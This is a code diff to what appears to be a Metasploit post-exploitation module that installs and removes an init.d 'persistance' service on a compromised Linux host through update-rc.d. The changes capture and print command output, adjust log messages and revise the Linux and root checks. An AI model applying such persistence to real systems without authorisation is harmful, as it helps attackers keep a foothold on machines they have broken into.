@@ -139,6 +139,7 @@ class MetasploitModule < Msf::Post
 #
 def ls_stage1
 
+  output=''
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']          # /etc/init.d
@@ -220,7 +221,10 @@ def ls_stage1
         cmd_exec("chmod +x #{script_check}")
         vprint_good("Update init.d service status (symlinks) ..")
         Rex::sleep(1.0)
-        cmd_exec("update-rc.d persistance defaults # 97 03")
+        output = cmd_exec("update-rc.d persistance defaults # 97 03")
+        vprint_line("")
+        vprint_line(output)
+        vprint_line("")
       else
         vprint_error("%red" + "init.d script: #{script_check} not found ..")
         vprint_error("Persistence not achieved ..")
@@ -250,6 +254,7 @@ end
 #
 def ls_stage2
 
+  output=''
   session = client
   rem = session.sys.config.sysinfo
   init = datastore['INIT_PATH']        # /etc/init.d
@@ -279,11 +284,14 @@ def ls_stage2
       #
       # Delete init.d script ..
       #
-      vprint_status("Remove script from init.d directory ..")
+      vprint_good("Remove script from init.d directory ..")
       Rex::sleep(1.0)
       cmd_exec("rm -f #{init}/persistance")
-      vprint_status("Delete persistence service (symlinks) ..")
-      cmd_exec("update-rc.d persistance remove")
+      vprint_good("Delete persistence service (symlinks) ..")
+      output = cmd_exec("update-rc.d persistance remove")
+      vprint_line("")
+      vprint_line(output)
+      vprint_line("")
       Rex::sleep(1.5)
 
     #
@@ -323,7 +331,6 @@ def run
   session = client
 
       # Variable declarations (msf API calls)
-      # distro = get_sysinfo
       sysnfo = session.sys.config.sysinfo
       runtor = client.sys.config.getuid
       runsession = client.session_host
@@ -349,17 +356,15 @@ def run
     # the 'def check()' funtion that rapid7 requires to accept new modules.
     # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
     #
-    # check for proper operative system (Linux Kali)
-    # if not distro =~ /Kali/
-    # if not sysinfo['OS'] =~ /Linux/
-    if not session.platform.include?("linux")
+    # check for proper operative system (Linux)
+    if not session.platform == 'linux'
       vprint_error("%red" + "[ ABORT ]: This module only works againt Linux systems")
       return nil
     end
     #
     # Check if we are running in an higth integrity context ..
     #
-    unless is_root?
+    if not is_root?
       vprint_error("%red" + "[ ABORT ]: Root access is required ..")
       return nil
     end
